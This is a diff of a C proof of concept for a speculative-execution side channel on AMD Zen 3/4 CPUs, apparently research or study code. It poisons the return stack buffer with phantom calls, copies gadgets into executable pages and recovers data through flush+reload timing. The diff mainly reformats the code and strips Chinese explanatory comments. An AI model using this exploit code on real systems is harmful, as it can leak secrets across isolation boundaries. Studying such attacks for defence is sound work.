@@ -10,11 +10,11 @@
 
 sigjmp_buf mark;
 
-#define RB_PTR 0x13370000
+#define RB_PTR         0x13370000
 #define RB_STRIDE_BITS 12
-#define RB_STRIDE (0x1UL << RB_STRIDE_BITS)
-#define RB_SLOTS 0x21
-#define RSB_SIZE 32
+#define RB_STRIDE      (0x1UL << RB_STRIDE_BITS)
+#define RB_SLOTS       0x21
+#define RSB_SIZE       32
 
 #ifdef BOGUS
 #define PTRN 0x111000000000UL
@@ -22,21 +22,15 @@ sigjmp_buf mark;
 #define PTRN 0x100100000000UL // Zen 3/4
 #endif
 
-// TODO:为什么需要定义这个宏?
-// 人为构造的“伪返回地址（phantom return address）”
-// 高位看起来像 canonical user VA;低位可控（方便异或/编码）不是一个真实函数地址;它是一个“RSB-only 有效”的返回地址
-#define PHANTOM_CALL 0x4000000003fUL
-// TODO:下面两个宏定义不是一样的吗?
-// 用于 训练 RSB（aliasing）
+#define PHANTOM_CALL        0x4000000003fUL
 #define CALL_FN_TRAIN_ALIAS (PHANTOM_CALL ^ PTRN)
-// 用于 未训练路径上的跳转目标
-#define CALL_DEST_UNTRAIN (PHANTOM_CALL ^ PTRN)
+#define CALL_DEST_UNTRAIN   (PHANTOM_CALL ^ PTRN)
 
 #define ROUNDS 10000
 
 #define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE)
-#define PROT_RW (PROT_READ | PROT_WRITE)
-#define PROT_RWX (PROT_RW | PROT_EXEC)
+#define PROT_RW    (PROT_READ | PROT_WRITE)
+#define PROT_RWX   (PROT_RW | PROT_EXEC)
 
 __attribute__((aligned(4096))) static uint64_t results1[RB_SLOTS] = {0};
 __attribute__((aligned(4096))) static uint64_t results2[RB_SLOTS] = {0};
@@ -71,16 +65,15 @@ __attribute__((aligned(4096))) static uint64_t results30[RB_SLOTS] = {0};
 __attribute__((aligned(4096))) static uint64_t results31[RB_SLOTS] = {0};
 __attribute__((aligned(4096))) static uint64_t results32[RB_SLOTS] = {0};
 
-#define NOPS_str(n)            \
-    ".rept " xstr(n) "\n\t"    \
-                     "nop\n\t" \
+#define NOPS_str(n)                                                                      \
+    ".rept " xstr(n) "\n\t"                                                              \
+                     "nop\n\t"                                                           \
                      ".endr\n\t"
 
-#define str(s) #s
+#define str(s)  #s
 #define xstr(s) str(s)
 
-static inline __attribute__((always_inline)) uint64_t rdtsc(void)
-{
+static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
     uint64_t lo, hi;
     asm volatile("CPUID\n\t"
                  "RDTSC\n\t"
@@ -90,8 +83,7 @@ static inline __attribute__((always_inline)) uint64_t rdtsc(void)
     return (hi << 32) | lo;
 }
 
-static inline __attribute__((always_inline)) uint64_t rdtscp(void)
-{
+static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
     uint64_t lo, hi;
     asm volatile("RDTSCP\n\t"
                  "movq %%rdx, %0\n\t"
@@ -101,30 +93,20 @@ static inline __attribute__((always_inline)) uint64_t rdtscp(void)
     return (hi << 32) | lo;
 }
 
-// stride一般为2^12=4KB(一个页面大小);base一般是RB_PTR;results的长度为33;
-// 按照不同的次序访问RSB内部的值并统计时间
 static inline __attribute__((always_inline)) void reload_range(long base, long stride,
-                                                               int n, uint64_t *results)
-{
+                                                               int n, uint64_t *results) {
     asm("lfence");
     asm("mfence");
     int done = 0;
-    // TODO:为什么每次的步长为2以及为什么先处理前n/2?
-    for (volatile int k = 0; k < n / 2; k += 2)
-    {
-        // n/2-1=0x1111;k=0 2 4 6 8
+    for (volatile int k = 0; k < n / 2; k += 2) {
         uint64_t c = (n / 2) - 1 - ((k * 13 + 9) & ((n / 2) - 1));
-        // 选中c对应;因为res数组长度为33因此c小于33
-        unsigned volatile char *p = (uint8_t *)base + (stride * c);
-
+        unsigned volatile char *p = (uint8_t *) base + (stride * c);
         uint64_t t0 = rdtsc();
-        *(volatile unsigned char *)p;
+        *(volatile unsigned char *) p;
         uint64_t dt = rdtscp() - t0;
         if (dt < 200)
             results[c]++;
-        // TODO:先处理偶数位置,然后在处理奇数是为什么?
-        if (k == (n / 2) - 2 && !done)
-        {
+        if (k == (n / 2) - 2 && !done) {
             k = -1;
             done = 1;
         }
@@ -133,18 +115,15 @@ static inline __attribute__((always_inline)) void reload_range(long base, long s
     asm("mfence");
 
     done = 0;
-    for (volatile int k = 0; k < n / 2; k += 2)
-    {
+    for (volatile int k = 0; k < n / 2; k += 2) {
         uint64_t c = (n / 2) + (n / 2) - 1 - ((k * 13 + 9) & ((n / 2) - 1));
-        unsigned volatile char *p = (uint8_t *)base + (stride * c);
-
+        unsigned volatile char *p = (uint8_t *) base + (stride * c);
         uint64_t t0 = rdtsc();
-        *(volatile unsigned char *)p;
+        *(volatile unsigned char *) p;
         uint64_t dt = rdtscp() - t0;
         if (dt < 200)
             results[c]++;
-        if (k == (n / 2) - 2 && !done)
-        {
+        if (k == (n / 2) - 2 && !done) {
             k = -1;
             done = 1;
         }
@@ -152,11 +131,10 @@ static inline __attribute__((always_inline)) void reload_range(long base, long s
     asm("lfence");
     asm("mfence");
 
-    if (n % 2 == 1)
-    {
-        unsigned volatile char *p = (uint8_t *)base + (stride * (n - 1));
+    if (n % 2 == 1) {
+        unsigned volatile char *p = (uint8_t *) base + (stride * (n - 1));
         uint64_t t0 = rdtsc();
-        *(volatile unsigned char *)p;
+        *(volatile unsigned char *) p;
         uint64_t dt = rdtscp() - t0;
         if (dt < 200)
             results[n - 1]++;
@@ -164,14 +142,11 @@ static inline __attribute__((always_inline)) void reload_range(long base, long s
 }
 
 static inline __attribute__((always_inline)) void flush_range(long start, long stride,
-                                                              int n)
-{
+                                                              int n) {
     asm("lfence");
     asm("mfence");
-    for (uint64_t k = 0; k < n; ++k)
-    {
-        volatile void *p = (uint8_t *)start + k * stride;
-        // TODO:为什么这里需要flush两次?
+    for (uint64_t k = 0; k < n; ++k) {
+        volatile void *p = (uint8_t *) start + k * stride;
         __asm__ volatile("clflushopt (%0)\n" ::"r"(p));
         __asm__ volatile("clflushopt (%0)\n" ::"r"(p));
     }
@@ -179,12 +154,8 @@ static inline __attribute__((always_inline)) void flush_range(long start, long s
     asm("mfence");
 }
 
-// 为了精确控制指令布局、对齐、RSB 行为和 BTB/RSB 训练边界
 void phantom_jmp();
 void phantom_jmp_end();
-// 让函数入口对齐到 4KB 边界（页对齐）,避免：I-cache alias&BTB entry 冲突;每个 gadget 独占预测资源
-// 返回地址是当前 RIP+5;该返回地址会被压入 RSB;%r8 指向的目标并不重要,RSB 被 push 了一条记录
-// 稍后根本不会 ret 回这个真实位置,RSB 中的 entry 会被 错误地消费,预测会跳到 PHANTOM_CALL
 asm(".align 0x1000\n\t"
     "phantom_jmp:\n\t"
     "call *%r8\n\t"
@@ -209,72 +180,59 @@ asm(".align 0x1000\n\t"
 
 void phantom_jump_insert();
 
-void clean_exit_on_sig(int sig_num)
-{
+void clean_exit_on_sig(int sig_num) {
     siglongjmp(mark, 1);
 }
 
-int main(int argc, char *argv[])
-{
+int main(int argc, char *argv[]) {
     signal(SIGSEGV, clean_exit_on_sig);
 
     // We first allocate the reload buffer
-    if (mmap((void *)RB_PTR, ((RB_SLOTS + 1) << RB_STRIDE_BITS), PROT_RW, MMAP_FLAGS, -1,
-             0) == MAP_FAILED)
-    {
+    if (mmap((void *) RB_PTR, ((RB_SLOTS + 1) << RB_STRIDE_BITS), PROT_RW, MMAP_FLAGS, -1,
+             0) == MAP_FAILED) {
         err(1, "rb");
     }
 
-    // TODO:一个函数强转uint64_t后^一个PTRN地址值是什么意思?
-    uint64_t jmp_fn_train_alias = (uint64_t)phantom_jump_insert ^ PTRN;
+    uint64_t jmp_fn_train_alias = (uint64_t) phantom_jump_insert ^ PTRN;
 
-    // TODO:这里是分配32KB吗?
-    if (mmap((void *)(jmp_fn_train_alias & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1,
-             0) == MAP_FAILED)
-    {
+    if (mmap((void *) (jmp_fn_train_alias & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1,
+             0) == MAP_FAILED) {
         err(1, "jmp_fn_train");
     }
 
-    memcpy((void *)jmp_fn_train_alias, phantom_jmp, phantom_jmp_end - phantom_jmp);
+    memcpy((void *) jmp_fn_train_alias, phantom_jmp, phantom_jmp_end - phantom_jmp);
 
-    if (mmap((void *)(CALL_DEST_UNTRAIN & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1,
-             0) == MAP_FAILED)
-    {
+    if (mmap((void *) (CALL_DEST_UNTRAIN & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1,
+             0) == MAP_FAILED) {
         err(1, "CALL_DEST_UNTRAIN");
     }
 
-    memcpy((void *)CALL_DEST_UNTRAIN, phantom_call, phantom_call_end - phantom_call);
+    memcpy((void *) CALL_DEST_UNTRAIN, phantom_call, phantom_call_end - phantom_call);
 
     uint64_t *results_arr[32] = {
-        results1, results2, results3, results4, results5, results6, results7,
-        results8, results9, results10, results11, results12, results13, results14,
+        results1,  results2,  results3,  results4,  results5,  results6,  results7,
+        results8,  results9,  results10, results11, results12, results13, results14,
         results15, results16, results17, results18, results19, results20, results21,
         results22, results23, results24, results25, results26, results27, results28,
         results29, results30, results31, results32};
 
-    for (int k = 0; k < 32; k++)
-    {
+    for (int k = 0; k < 32; k++) {
         uint64_t *res = results_arr[k];
-        for (int i = 0; i < 33; i++)
-        {
+        for (int i = 0; i < 33; i++) {
             res[i] = 0;
         }
     }
 
-    for (int i = 0; i < ROUNDS; i++)
-    {
-        if (sigsetjmp(mark, 1) == 0)
-        {
+    for (int i = 0; i < ROUNDS; i++) {
+        if (sigsetjmp(mark, 1) == 0) {
             // clang-format off
-            // TODO:为什么要定义一个1:标号?
             asm("mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
                 "jmp *%[phantom_train]\n\t"
                 "1:\n\t" ::[phantom_train] "r"(jmp_fn_train_alias) : "r8");
             // clang-format on
         }
 
-        if (sigsetjmp(mark, 1) == 0)
-        {
+        if (sigsetjmp(mark, 1) == 0) {
             // clang-format off
             asm("mov $1f, %%r10\n\t"
                 "mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
@@ -285,12 +243,10 @@ int main(int argc, char *argv[])
             // clang-format on
         }
 
-        // TODO:这里的意义是什么?
-        if (mmap((void *)(PHANTOM_CALL & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1, 0) ==
-            MAP_FAILED)
-        {
+        if (mmap((void *) (PHANTOM_CALL & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1, 0) ==
+            MAP_FAILED) {
         }
-        memcpy((void *)PHANTOM_CALL, leak, leak_end - leak);
+        memcpy((void *) PHANTOM_CALL, leak, leak_end - leak);
 
         // clang-format off
         asm(".secret=0\n\t"
@@ -327,8 +283,7 @@ int main(int argc, char *argv[])
         // clang-format on
 
         // Execute RSB_SIZE returns
-        for (int k = 0; k < RSB_SIZE; k++)
-        {
+        for (int k = 0; k < RSB_SIZE; k++) {
             flush_range(RB_PTR, 1 << RB_STRIDE_BITS, RB_SLOTS);
             asm("mfence\n\t"
                 "pushq $1f\n\t"
@@ -342,22 +297,19 @@ int main(int argc, char *argv[])
             reload_range(RB_PTR, 1 << RB_STRIDE_BITS, RB_SLOTS, res);
         }
 
-        munmap((void *)(PHANTOM_CALL & ~0xfff), 0x8000);
+        munmap((void *) (PHANTOM_CALL & ~0xfff), 0x8000);
     }
 
     // Print results
     printf("     Return: ");
-    for (int i = 0; i < RSB_SIZE; i++)
-    {
+    for (int i = 0; i < RSB_SIZE; i++) {
         printf(" - %05d", i + 1);
     }
     printf("\n");
 
-    for (int i = 0; i < RSB_SIZE; ++i)
-    {
+    for (int i = 0; i < RSB_SIZE; ++i) {
         printf("RB entry %02d: ", i);
-        for (int k = 0; k < RSB_SIZE; k++)
-        {
+        for (int k = 0; k < RSB_SIZE; k++) {
             uint64_t *res = results_arr[k];
             printf(" - %05ld", res[i]);
         }
@@ -365,8 +317,7 @@ int main(int argc, char *argv[])
     }
 
     printf("   Hijacked: ");
-    for (int i = 0; i < RSB_SIZE; i++)
-    {
+    for (int i = 0; i < RSB_SIZE; i++) {
         uint64_t *res = results_arr[i];
         printf(" - %05ld", res[RSB_SIZE]);
     }
